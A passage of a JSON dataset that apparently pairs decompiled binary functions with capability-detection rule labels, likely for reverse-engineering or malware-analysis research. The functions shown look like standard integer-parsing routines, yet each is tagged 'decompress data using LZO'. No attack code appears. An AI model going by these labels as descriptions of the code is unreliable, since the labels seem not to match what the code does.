0xbfU) goto code_r0x00464743;\n    uVar12 = iVar5 - 0x37;\n    goto code_r0x004644c6;\ncode_r0x00464743:\n    var_50h._2_1_ = 0;\n    if (var_2ch == 0) goto code_r0x0046454e;\ncode_r0x00464752:\n    fcn.004b20a0(var_44h);\n    cVar2 = fcn.004bdf20(*(iVar3 + 8), *(iVar3 + 0xc), &var_31h + 1);\n    if (cVar2 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar6) || ((var_44h | var_2ch) != 0)) goto code_r0x00464797;\n    goto code_r0x00464563;\n}\n",
        "token_count": 5014
    },
    "00464d70": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.00464d70(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    bool bVar7;\n    bool bVar8;\n    uint32_t uVar9;\n    bool bVar10;\n    char cVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    bool bVar14;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint8_t var_4fh;\n    uint8_t var_4eh;\n    uint32_t var_4dh;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_ch;\n    \n    iVar6 = arg_18h;\n    uVar13 = 8;\n    iVar3 = fcn.0044da00(arg_18h + 0x6c);\n    uVar4 = *(iVar6 + 0xc) & 0x4a;\n    if ((uVar4 != 0x40) && (uVar13 = 10,  uVar4 == 8)) {\n        uVar13 = 0x10;\n    }\n    bVar7 = arg_8h != NULL && arg_ch == 0xffffffff;\n    bVar14 = arg_ch == 0xffffffff;\n    if (((bVar7) && (bVar14 = false,  arg_8h[3] <= arg_8h[2])) && (iVar6 = (**(*arg_8h + 0x24))(),  iVar6 == -1)) {\n        arg_8h = NULL;\n        bVar14 = bVar7;\n    }\n    bVar7 = arg_10h != NULL && arg_14h == -1;\n    var_44h._0_1_ = arg_14h == -1;\n    if ((bVar7) && (var_44h._0_1_ = false,  arg_10h[3] <= arg_10h[2])) {\n        iVar6 = (**(*arg_10h + 0x24))();\n        var_44h._0_1_ = false;\n        if (iVar6 == -1) {\n            arg_10h = NULL;\n            var_44h._0_1_ = bVar7;\n        }\n    }\n    if (var_44h == bVar14) {\n        bVar14 = false;\n        uVar12 = 0;\n        var_4dh._0_1_ = 1;\n        var_44h = 0;\n        bVar7 = false;\n    }\n    else {\n        uVar12 = arg_ch;\n        if ((arg_ch == 0xffffffff) && (arg_8h != NULL)) {\n            if (arg_8h[3] <= arg_8h[2]) {\n                uVar12 = (**(*arg_8h + 0x24))();\n                if (uVar12 == 0xffffffff) {\n                    arg_8h = NULL;\n                    uVar12 = 0xffffffff;\n                }\n                goto code_r0x00464e00;\n            }\n            uVar1 = *arg_8h[2];\n            uVar12 = uVar1;\n            cVar2 = *(iVar3 + 0x10);\n            bVar14 = *(iVar3 + 0x4a) == uVar1;\n            if (!bVar14) goto code_r0x00464e10;\ncode_r0x00464e19:\n            if (((cVar2 == '\\0') || (*(iVar3 + 0x25) != uVar12)) && (*(iVar3 + 0x24) != uVar12)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 1;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = 0xffffffff;\n                var_4dh._0_1_ = fcn.004502d0(&arg_10h);\n                var_44h = 0;\n                bVar7 = false;\n                if (var_4dh != 0) goto code_r0x00464e70;\n                uVar12 = fcn.00450370();\n                cVar2 = *(iVar3 + 0x10);\n            }\n        }\n        else {\ncode_r0x00464e00:\n            cVar2 = *(iVar3 + 0x10);\n            bVar14 = *(iVar3 + 0x4a) == uVar12;\n            if (bVar14) goto code_r0x00464e19;\ncode_r0x00464e10:\n            if (*(iVar3 + 0x4b) == uVar12) goto code_r0x00464e19;\n            bVar14 = false;\n        }\n        var_44h = 0;\n        bVar7 = false;\n        while (((cVar11 = uVar12,  cVar2 == '\\0' || (*(iVar3 + 0x25) != cVar11)) && (*(iVar3 + 0x24) != cVar11))) {\n            if (*(iVar3 + 0x4e) == cVar11) {\n                bVar8 = uVar13 == 10 | bVar7 ^ 1U;\n                if (!bVar8) goto code_r0x0046503a;\n                bVar7 = uVar4 == 0 || uVar13 == 8;\n                if (uVar4 != 0 && uVar13 != 8) {\n                    var_44h = var_44h + 1;\n                    goto code_r0x0046506e;\n                }\n                var_44h = 0;\n                uVar13 = 8;\n                uVar5 = arg_8h[2];\n                if (arg_8h[3] <= uVar5) goto code_r0x00465110;\ncode_r0x0046507d:\n                arg_8h[2] = uVar5 + 1;\ncode_r0x0046508a:\n                var_48h._0_1_ = false;\n                if ((arg_8h[3] <= arg_8h[2]) && (iVar6 = (**(*arg_8h + 0x24))(),  iVar6 == -1)) {\n                    arg_8h = NULL;\n                    var_48h._0_1_ = true;\n                }\n            }\n            else {\n                if (!bVar7) break;\ncode_r0x0046503a:\n                if ((*(iVar3 + 0x4c) != cVar11) && (*(iVar3 + 0x4d) != cVar11)) {\n                    var_4dh._0_1_ = 0;\n                    bVar7 = true;\n                    goto code_r0x00464e70;\n                }\n                var_4dh._0_1_ = uVar13 == 0x10 || uVar4 == 0;\n                if (uVar13 != 0x10 && uVar4 != 0) {\n                    bVar7 = true;\n                    goto code_r0x00464e7c;\n                }\n                var_44h = 0;\n                uVar13 = 0x10;\n                bVar8 = false;\ncode_r0x0046506e:\n                uVar5 = arg_8h[2];\n                bVar7 = bVar8;\n                if (uVar5 < arg_8h[3]) goto code_r0x0046507d;\ncode_r0x00465110:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x0046508a;\n                var_48h._0_1_ = true;\n            }\n            arg_ch = 0xffffffff;\n            bVar10 = arg_10h != NULL && arg_14h == -1;\n            bVar8 = arg_14h == -1;\n            if ((bVar10) && (bVar8 = false,  arg_10h[3] <= arg_10h[2])) {\n                iVar6 = (**(*arg_10h + 0x24))();\n                bVar8 = false;\n                if (iVar6 == -1) {\n                    arg_10h = NULL;\n                    bVar8 = bVar10;\n                }\n            }\n            if (bVar8 == var_48h._0_1_) {\n                var_4dh._0_1_ = 1;\n                goto code_r0x00464e70;\n            }\n            uVar12 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar12 = *arg_8h[2];\n                }\n                else {\n                    uVar12 = (**(*arg_8h + 0x24))();\n                    if (uVar12 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar12 = 0xffffffff;\n                    }\n                }\n            }\n            if (!bVar7) break;\n            cVar2 = *(iVar3 + 0x10);\n        }\n        var_4dh._0_1_ = 0;\n    }\ncode_r0x00464e70:\n    stack0xffffffb0 = 0x16;\n    if (uVar13 != 0x10) {\ncode_r0x00464e7c:\n        unique0x1000043c = uVar13;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (*(iVar3 + 0x10) != '\\0') {\n        fcn.004b1bc0(0x20);\n    }\n    uVar4 = bVar14 + 0x7fffffff;\n    var_4eh = *(iVar3 + 100);\n    if (var_4eh == 0) {\n        if (var_4dh == 0) {\n            var_4fh = 0;\n            var_48h = 0;\ncode_r0x00464ee0:\n            cVar2 = uVar12;\n            iVar6 = cVar2;\n            if (stack0xffffffb0 < 0xb) {\n                if ((cVar2 < '0') || (var_4dh._1_1_ + '0' <= cVar2)) goto code_r0x00465183;\n            }\n            else if (9 < cVar2 - 0x30U) goto code_r0x0046516c;\n            iVar6 = iVar6 + -0x30;\ncode_r0x00464f02:\n            if (iVar6 != -1) {\n                do {\n                    if (uVar4 / uVar13 < var_48h) {\n                        var_4fh = 1;\n                        uVar12 = arg_8h[2];\n                        if (arg_8h[3] <= uVar12) goto code_r0x00465223;\ncode_r0x00464f3f:\n                        arg_8h[2] = uVar12 + 1;\ncode_r0x00464f4c:\n                        var_4eh = false;\n                        if (arg_8h[3] <= arg_8h[2]) {\n                            iVar6 = (**(*arg_8h + 0x24))();\n                            var_4eh = false;\n                            if (iVar6 == -1) {\n                                arg_8h = NULL;\n                                var_4eh = true;\n                            }\n                        }\n                    }\n                    else {\n                        uVar12 = var_48h * uVar13;\n                        var_48h = iVar6 + uVar12;\n                        var_4fh = var_4fh | uVar4 - iVar6 < uVar12;\n                        uVar12 = arg_8h[2];\n                        var_44h = var_44h + 1;\n                        if (uVar12 < arg_8h[3]) goto code_r0x00464f3f;\ncode_r0x00465223:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x00464f4c;\n                        var_4eh = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar10 = arg_10h != NULL && arg_14h == -1;\n                    bVar8 = arg_14h == -1;\n                    if ((bVar10) && (bVar8 = false,  arg_10h[3] <= arg_10h[2])) {\n                        iVar6 = (**(*arg_10h + 0x24))();\n                        bVar8 = false;\n                        if (iVar6 == -1) {\n                            arg_10h = NULL;\n                            bVar8 = bVar10;\n                        }\n                    }\n                    if (bVar8 == var_4eh) {\n                        var_4eh = 1;\n                        goto code_r0x00464f83;\n                    }\n                    uVar12 = arg_ch;\n                    if (arg_8h == NULL) goto code_r0x00464ee0;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar12 = *arg_8h[2];\n                        goto code_r0x00464ee0;\n                    }\n                    uVar12 = (**(*arg_8h + 0x24))();\n                    if (uVar12 != 0xffffffff) goto code_r0x00464ee0;\n                    arg_8h = NULL;\n                    if (stack0xffffffb0 < 0xb) break;\n                    cVar2 = -1;\n                    iVar6 = -1;\ncode_r0x0046516c:\n                    if (5 < cVar2 + 0x9fU) goto code_r0x004652e0;\n                    iVar6 = iVar6 + -0x57;\n                    if (iVar6 == -1) break;\n                } while( true );\n            }\n            goto code_r0x00465183;\n        }\n        var_4eh = var_4dh;\n        var_4fh = 0;\n        var_4dh._0_1_ = 0;\n        var_48h = 0;\n    }\n    else {\n        if (var_4dh == 0) {\n            var_4fh = 0;\n            var_48h = 0;\ncode_r0x0046534b:\n            uVar5 = var_2ch;\n            cVar2 = uVar12;\n            if ((*(iVar3 + 0x10) == 0) || (*(iVar3 + 0x25) != cVar2)) {\n                if ((cVar2 == *(iVar3 + 0x24)) ||\n                   (iVar6 = sub.msvcrt.dll_memchr(iVar3 + 0x4e, cVar2, stack0xffffffb0),  iVar6 == 0))\n                goto code_r0x00465183;\n                iVar6 = iVar6 - (iVar3 + 0x4e);\n                if (0xf < iVar6) {\n                    iVar6 = iVar6 + -6;\n                }\n                if (var_48h <= uVar4 / uVar13) {\n                    uVar12 = var_48h * uVar13;\n                    var_48h = iVar6 + uVar12;\n                    var_4fh = var_4fh | uVar4 - iVar6 < uVar12;\n                    var_44h = var_44h + 1;\n                    goto code_r0x004653b3;\n                }\n                uVar12 = arg_8h[2];\n                var_4fh = var_4eh;\n                if (arg_8h[3] <= uVar12) goto code_r0x00465412;\ncode_r0x004653be:\n                arg_8h[2] = uVar12 + 1;\ncode_r0x004653cb:\n                var_60h._0_1_ = 0;\n                if (arg_8h[3] <= arg_8h[2]) {\n                    iVar6 = (**(*arg_8h + 0x24))();\n                    var_60h._0_1_ = 0;\n                    if (iVar6 == -1) {\n                        arg_8h = NULL;\n                        var_60h._0_1_ = var_4eh;\n                    }\n                }\n            }\n            else {\n                if (var_44h == 0) {\n                    var_4eh = 0;\n                    var_4dh._0_1_ = *(iVar3 + 0x10);\n                    goto code_r0x00464f83;\n                }\n                uVar12 = var_2ch + 1;\n                uVar9 = 0xf;\n                if (stack0xffffffcc != &var_28h) {\n                    uVar9 = var_28h;\n                }\n                if (uVar9 < uVar12) {\n                    fcn.004b1f10(var_2ch, 0, 0, 1);\n                }\n                var_44h = 0;\n                *(stack0xffffffcc + uVar5) = var_44h;\n                *(stack0xffffffcc + uVar12) = 0;\n                var_2ch = uVar12;\ncode_r0x004653b3:\n                uVar12 = arg_8h[2];\n                if (uVar12 < arg_8h[3]) goto code_r0x004653be;\ncode_r0x00465412:\n                (**(*arg_8h + 0x28))();\n                var_60h._0_1_ = var_4eh;\n                if (arg_8h != NULL) goto code_r0x004653cb;\n            }\n            arg_ch = 0xffffffff;\n            bVar10 = arg_10h != NULL && arg_14h == -1;\n            bVar8 = arg_14h == -1;\n            if ((bVar10) && (bVar8 = false,  arg_10h[3] <= arg_10h[2])) {\n                iVar6 = (**(*arg_10h + 0x24))();\n                bVar8 = false;\n                if (iVar6 == -1) {\n                    arg_10h = NULL;\n                    bVar8 = bVar10;\n                }\n            }\n            if (bVar8 == var_60h) goto code_r0x00464f83;\n            uVar12 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar12 = *arg_8h[2];\n                }\n                else {\n                    uVar12 = (**(*arg_8h + 0x24))();\n                    if (uVar12 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar12 = 0xffffffff;\n                    }\n                }\n            }\n            goto code_r0x0046534b;\n        }\n        var_48h = 0;\n        var_4fh = 0;\n        var_4eh = var_4dh;\n        var_4dh._0_1_ = 0;\n    }\ncode_r0x00464f83:\n    if (var_2ch != 0) goto code_r0x00465192;\ncode_r0x00464f8b:\n    if ((var_44h != 0) || (bVar7)) {\ncode_r0x004651d7:\n        if (var_4dh == 0) {\n            if (var_4fh == 0) {\n                uVar4 = -var_48h;\n                if (!bVar14) {\n                    uVar4 = var_48h;\n                }\n                *arg_20h = uVar4;\n            }\n            else {\n                *arg_20h = bVar14 + 0x7fffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x00464fb2;\n        }\n    }\ncode_r0x00464fa0:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x00464fb2:\n    if (var_4eh != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != &var_28h) {\n        fcn.004c2c30(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x004652e0:\n    if (5 < cVar2 + 0xbfU) goto code_r0x00465183;\n    iVar6 = iVar6 + -0x37;\n    goto code_r0x00464f02;\ncode_r0x00465183:\n    var_4eh = 0;\n    if (var_2ch == 0) goto code_r0x00464f8b;\ncode_r0x00465192:\n    fcn.004b20a0(var_44h);\n    cVar2 = fcn.004bdf20(*(iVar3 + 8), *(iVar3 + 0xc), &var_31h + 1);\n    if (cVar2 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar7) || ((var_44h | var_2ch) != 0)) goto code_r0x004651d7;\n    goto code_r0x00464fa0;\n}\n",
        "token_count": 4921
    },
    "004657c0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Could not reconcile some variable overlaps\n\nulong __cdecl\nfcn.004657c0(int32_t *arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h, uint32_t *arg_1ch, \n            uint32_t *arg_20h)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    bool bVar6;\n    bool bVar7;\n    uint32_t uVar8;\n    bool bVar9;\n    char cVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    bool bVar14;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint32_t var_4ch;\n    uint32_t var_48h;\n    uint32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint *var_31h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_ch;\n    \n    iVar5 = arg_18h;\n    uVar13 = 8;\n    iVar3 = fcn.0044da00(arg_18h + 0x6c);\n    uVar4 = *(iVar5 + 0xc) & 0x4a;\n    if ((uVar4 != 0x40) && (uVar13 = 10,  uVar4 == 8)) {\n        uVar13 = 0x10;\n    }\n    bVar6 = arg_8h != NULL && arg_ch == 0xffffffff;\n    bVar14 = arg_ch == 0xffffffff;\n    if (((bVar6) && (bVar14 = false,  arg_8h[3] <= arg_8h[2])) && (iVar5 = (**(*arg_8h + 0x24))(),  iVar5 == -1)) {\n        arg_8h = NULL;\n        bVar14 = bVar6;\n    }\n    bVar6 = arg_10h != NULL && arg_14h == -1;\n    var_44h._0_1_ = arg_14h == -1;\n    if ((bVar6) && (var_44h._0_1_ = false,  arg_10h[3] <= arg_10h[2])) {\n        iVar5 = (**(*arg_10h + 0x24))();\n        var_44h._0_1_ = false;\n        if (iVar5 == -1) {\n            arg_10h = NULL;\n            var_44h._0_1_ = bVar6;\n        }\n    }\n    if (var_44h == bVar14) {\n        bVar14 = false;\n        uVar12 = 0;\n        var_50h._3_1_ = 1;\n        var_44h = 0;\n        bVar6 = false;\n    }\n    else {\n        uVar12 = arg_ch;\n        if ((arg_ch == 0xffffffff) && (arg_8h != NULL)) {\n            if (arg_8h[3] <= arg_8h[2]) {\n                uVar12 = (**(*arg_8h + 0x24))();\n                if (uVar12 == 0xffffffff) {\n                    arg_8h = NULL;\n                    uVar12 = 0xffffffff;\n                }\n                goto code_r0x00465850;\n            }\n            uVar1 = *arg_8h[2];\n            uVar12 = uVar1;\n            cVar2 = *(iVar3 + 0x10);\n            bVar14 = *(iVar3 + 0x4a) == uVar1;\n            if (!bVar14) goto code_r0x00465860;\ncode_r0x00465869:\n            if (((cVar2 == '\\0') || (*(iVar3 + 0x25) != uVar12)) && (*(iVar3 + 0x24) != uVar12)) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    arg_8h[2] = arg_8h[2] + 1;\n                }\n                else {\n                    (**(*arg_8h + 0x28))();\n                }\n                arg_ch = 0xffffffff;\n                var_50h._3_1_ = fcn.004502d0(&arg_10h);\n                var_44h = 0;\n                bVar6 = false;\n                if (var_50h._3_1_ != 0) goto code_r0x004658c0;\n                uVar12 = fcn.00450370();\n                cVar2 = *(iVar3 + 0x10);\n            }\n        }\n        else {\ncode_r0x00465850:\n            cVar2 = *(iVar3 + 0x10);\n            bVar14 = *(iVar3 + 0x4a) == uVar12;\n            if (bVar14) goto code_r0x00465869;\ncode_r0x00465860:\n            if (*(iVar3 + 0x4b) == uVar12) goto code_r0x00465869;\n            bVar14 = false;\n        }\n        var_44h = 0;\n        bVar6 = false;\n        while (((cVar10 = uVar12,  cVar2 == '\\0' || (*(iVar3 + 0x25) != cVar10)) && (*(iVar3 + 0x24) != cVar10))) {\n            if (*(iVar3 + 0x4e) == cVar10) {\n                bVar7 = uVar13 == 10 | bVar6 ^ 1U;\n                if (!bVar7) goto code_r0x00465a7a;\n                bVar6 = uVar4 == 0 || uVar13 == 8;\n                if (uVar4 != 0 && uVar13 != 8) {\n                    var_44h = var_44h + 1;\n                    goto code_r0x00465aae;\n                }\n                var_44h = 0;\n                uVar13 = 8;\n                uVar11 = arg_8h[2];\n                if (arg_8h[3] <= uVar11) goto code_r0x00465b50;\ncode_r0x00465abd:\n                arg_8h[2] = uVar11 + 1;\ncode_r0x00465aca:\n                var_48h._0_1_ = false;\n                if ((arg_8h[3] <= arg_8h[2]) && (iVar5 = (**(*arg_8h + 0x24))(),  iVar5 == -1)) {\n                    arg_8h = NULL;\n                    var_48h._0_1_ = true;\n                }\n            }\n            else {\n                if (!bVar6) break;\ncode_r0x00465a7a:\n                if ((*(iVar3 + 0x4c) != cVar10) && (*(iVar3 + 0x4d) != cVar10)) {\n                    var_50h._3_1_ = 0;\n                    bVar6 = true;\n                    goto code_r0x004658c0;\n                }\n                var_50h._3_1_ = uVar13 == 0x10 || uVar4 == 0;\n                if (uVar13 != 0x10 && uVar4 != 0) {\n                    bVar6 = true;\n                    goto code_r0x004658cc;\n                }\n                var_44h = 0;\n                uVar13 = 0x10;\n                bVar7 = false;\ncode_r0x00465aae:\n                uVar11 = arg_8h[2];\n                bVar6 = bVar7;\n                if (uVar11 < arg_8h[3]) goto code_r0x00465abd;\ncode_r0x00465b50:\n                (**(*arg_8h + 0x28))();\n                if (arg_8h != NULL) goto code_r0x00465aca;\n                var_48h._0_1_ = true;\n            }\n            arg_ch = 0xffffffff;\n            bVar9 = arg_10h != NULL && arg_14h == -1;\n            bVar7 = arg_14h == -1;\n            if ((bVar9) && (bVar7 = false,  arg_10h[3] <= arg_10h[2])) {\n                iVar5 = (**(*arg_10h + 0x24))();\n                bVar7 = false;\n                if (iVar5 == -1) {\n                    arg_10h = NULL;\n                    bVar7 = bVar9;\n                }\n            }\n            if (var_48h._0_1_ == bVar7) {\n                var_50h._3_1_ = 1;\n                goto code_r0x004658c0;\n            }\n            uVar12 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar12 = *arg_8h[2];\n                }\n                else {\n                    uVar12 = (**(*arg_8h + 0x24))();\n                    if (uVar12 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar12 = 0xffffffff;\n                    }\n                }\n            }\n            if (!bVar6) break;\n            cVar2 = *(iVar3 + 0x10);\n        }\n        var_50h._3_1_ = 0;\n    }\ncode_r0x004658c0:\n    var_4ch = 0x16;\n    if (uVar13 != 0x10) {\ncode_r0x004658cc:\n        var_4ch = uVar13;\n    }\n    unique0x00001d00 = &var_28h;\n    var_2ch = 0;\n    var_28h = var_28h & 0xffffff00;\n    if (*(iVar3 + 0x10) != '\\0') {\n        fcn.004b1bc0(0x20);\n    }\n    uVar4 = 0xffffffff / uVar13;\n    var_50h._2_1_ = *(iVar3 + 100);\n    if (var_50h._2_1_ == 0) {\n        if (var_50h._3_1_ == 0) {\n            var_50h._1_1_ = 0;\n            var_48h = 0;\ncode_r0x00465924:\n            cVar2 = uVar12;\n            iVar5 = cVar2;\n            if (var_4ch < 0xb) {\n                if ((cVar2 < '0') || (var_4ch + '0' <= cVar2)) goto code_r0x00465bc3;\n            }\n            else if (9 < cVar2 - 0x30U) goto code_r0x00465bac;\n            uVar12 = iVar5 - 0x30;\ncode_r0x00465946:\n            if (uVar12 != 0xffffffff) {\n                do {\n                    if (uVar4 < var_48h) {\n                        var_50h._1_1_ = 1;\n                        uVar12 = arg_8h[2];\n                        if (arg_8h[3] <= uVar12) goto code_r0x00465c55;\ncode_r0x00465982:\n                        arg_8h[2] = uVar12 + 1;\ncode_r0x0046598f:\n                        var_50h._2_1_ = false;\n                        if (arg_8h[3] <= arg_8h[2]) {\n                            iVar5 = (**(*arg_8h + 0x24))();\n                            var_50h._2_1_ = false;\n                            if (iVar5 == -1) {\n                                arg_8h = NULL;\n                                var_50h._2_1_ = true;\n                            }\n                        }\n                    }\n                    else {\n                        uVar11 = var_48h * uVar13;\n                        var_48h = uVar12 + uVar11;\n                        var_50h._1_1_ = var_50h._1_1_ | ~uVar12 < uVar11;\n                        uVar12 = arg_8h[2];\n                        var_44h = var_44h + 1;\n                        if (uVar12 < arg_8h[3]) goto code_r0x00465982;\ncode_r0x00465c55:\n                        (**(*arg_8h + 0x28))();\n                        if (arg_8h != NULL) goto code_r0x0046598f;\n                        var_50h._2_1_ = true;\n                    }\n                    arg_ch = 0xffffffff;\n                    bVar9 = arg_10h != NULL && arg_14h == -1;\n                    bVar7 = arg_14h == -1;\n                    if ((bVar9) && (bVar7 = false,  arg_10h[3] <= arg_10h[2])) {\n                        iVar5 = (**(*arg_10h + 0x24))();\n                        bVar7 = false;\n                        if (iVar5 == -1) {\n                            arg_10h = NULL;\n                            bVar7 = bVar9;\n                        }\n                    }\n                    if (var_50h._2_1_ == bVar7) {\n                        var_50h._2_1_ = 1;\n                        goto code_r0x004659c6;\n                    }\n                    uVar12 = arg_ch;\n                    if (arg_8h == NULL) goto code_r0x00465924;\n                    if (arg_8h[2] < arg_8h[3]) {\n                        uVar12 = *arg_8h[2];\n                        goto code_r0x00465924;\n                    }\n                    uVar12 = (**(*arg_8h + 0x24))();\n                    if (uVar12 != 0xffffffff) goto code_r0x00465924;\n                    arg_8h = NULL;\n                    if (var_4ch < 0xb) break;\n                    cVar2 = -1;\n                    iVar5 = -1;\ncode_r0x00465bac:\n                    if (5 < cVar2 + 0x9fU) goto code_r0x00465d10;\n                    uVar12 = iVar5 - 0x57;\n                    if (uVar12 == 0xffffffff) break;\n                } while( true );\n            }\n            goto code_r0x00465bc3;\n        }\n        var_50h._2_1_ = var_50h._3_1_;\n        var_50h._1_1_ = 0;\n        var_50h._3_1_ = 0;\n        var_48h = 0;\n    }\n    else {\n        if (var_50h._3_1_ == 0) {\n            var_50h._1_1_ = 0;\n            var_48h = 0;\ncode_r0x00465d7b:\n            uVar11 = var_2ch;\n            cVar2 = uVar12;\n            if ((*(iVar3 + 0x10) == 0) || (*(iVar3 + 0x25) != cVar2)) {\n                if ((cVar2 == *(iVar3 + 0x24)) ||\n                   (iVar5 = sub.msvcrt.dll_memchr(iVar3 + 0x4e, cVar2, var_4ch),  iVar5 == 0)) goto code_r0x00465bc3;\n                uVar12 = iVar5 - (iVar3 + 0x4e);\n                if (0xf < uVar12) {\n                    uVar12 = uVar12 - 6;\n                }\n                if (var_48h <= uVar4) {\n                    uVar11 = var_48h * uVar13;\n                    var_48h = uVar12 + uVar11;\n                    var_50h._1_1_ = var_50h._1_1_ | ~uVar12 < uVar11;\n                    var_44h = var_44h + 1;\n                    goto code_r0x00465de2;\n                }\n                uVar12 = arg_8h[2];\n                var_50h._1_1_ = var_50h._2_1_;\n                if (arg_8h[3] <= uVar12) goto code_r0x00465e42;\ncode_r0x00465ded:\n                arg_8h[2] = uVar12 + 1;\ncode_r0x00465dfa:\n                var_5ch._0_1_ = 0;\n                if (arg_8h[3] <= arg_8h[2]) {\n                    iVar5 = (**(*arg_8h + 0x24))();\n                    var_5ch._0_1_ = 0;\n                    if (iVar5 == -1) {\n                        arg_8h = NULL;\n                        var_5ch._0_1_ = var_50h._2_1_;\n                    }\n                }\n            }\n            else {\n                if (var_44h == 0) {\n                    var_50h._2_1_ = 0;\n                    var_50h._3_1_ = *(iVar3 + 0x10);\n                    goto code_r0x004659c6;\n                }\n                uVar12 = var_2ch + 1;\n                uVar8 = 0xf;\n                if (stack0xffffffcc != &var_28h) {\n                    uVar8 = var_28h;\n                }\n                if (uVar8 < uVar12) {\n                    fcn.004b1f10(var_2ch, 0, 0, 1);\n                }\n                var_44h = 0;\n                *(stack0xffffffcc + uVar11) = var_44h;\n                *(stack0xffffffcc + uVar12) = 0;\n                var_2ch = uVar12;\ncode_r0x00465de2:\n                uVar12 = arg_8h[2];\n                if (uVar12 < arg_8h[3]) goto code_r0x00465ded;\ncode_r0x00465e42:\n                (**(*arg_8h + 0x28))();\n                var_5ch._0_1_ = var_50h._2_1_;\n                if (arg_8h != NULL) goto code_r0x00465dfa;\n            }\n            arg_ch = 0xffffffff;\n            bVar9 = arg_10h != NULL && arg_14h == -1;\n            bVar7 = arg_14h == -1;\n            if ((bVar9) && (bVar7 = false,  arg_10h[3] <= arg_10h[2])) {\n                iVar5 = (**(*arg_10h + 0x24))();\n                bVar7 = false;\n                if (iVar5 == -1) {\n                    arg_10h = NULL;\n                    bVar7 = bVar9;\n                }\n            }\n            if (var_5ch == bVar7) goto code_r0x004659c6;\n            uVar12 = arg_ch;\n            if (arg_8h != NULL) {\n                if (arg_8h[2] < arg_8h[3]) {\n                    uVar12 = *arg_8h[2];\n                }\n                else {\n                    uVar12 = (**(*arg_8h + 0x24))();\n                    if (uVar12 == 0xffffffff) {\n                        arg_8h = NULL;\n                        uVar12 = 0xffffffff;\n                    }\n                }\n            }\n            goto code_r0x00465d7b;\n        }\n        var_48h = 0;\n        var_50h._1_1_ = 0;\n        var_50h._2_1_ = var_50h._3_1_;\n        var_50h._3_1_ = 0;\n    }\ncode_r0x004659c6:\n    if (var_2ch != 0) goto code_r0x00465bd2;\ncode_r0x004659ce:\n    if ((var_44h != 0) || (bVar6)) {\ncode_r0x00465c17:\n        if (var_50h._3_1_ == 0) {\n            if (var_50h._1_1_ == 0) {\n                uVar4 = -var_48h;\n                if (!bVar14) {\n                    uVar4 = var_48h;\n                }\n                *arg_20h = uVar4;\n            }\n            else {\n                *arg_20h = 0xffffffff;\n                *arg_1ch = 4;\n            }\n            goto code_r0x004659f5;\n        }\n    }\ncode_r0x004659e3:\n    *arg_20h = 0;\n    *arg_1ch = 4;\ncode_r0x004659f5:\n    if (var_50h._2_1_ != 0) {\n        *arg_1ch = *arg_1ch | 2;\n    }\n    if (stack0xffffffcc != &var_28h) {\n        fcn.004c2c30(stack0xffffffcc);\n    }\n    return CONCAT44(arg_ch, arg_8h);\ncode_r0x00465d10:\n    if (5 < cVar2 + 0xbfU) goto code_r0x00465bc3;\n    uVar12 = iVar5 - 0x37;\n    goto code_r0x00465946;\ncode_r0x00465bc3:\n    var_50h._2_1_ = 0;\n    if (var_2ch == 0) goto code_r0x004659ce;\ncode_r0x00465bd2:\n    fcn.004b20a0(var_44h);\n    cVar2 = fcn.004bdf20(*(iVar3 + 8), *(iVar3 + 0xc), &var_31h + 1);\n    if (cVar2 == '\\0') {\n        *arg_1ch = 4;\n    }\n    if ((bVar6) || ((var_44h | var_2ch) != 0)) goto code_r0x00465c17;\n    goto code_r0x004659e3;\n}\n",
        "token_count": 5021
    },
    "004661f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
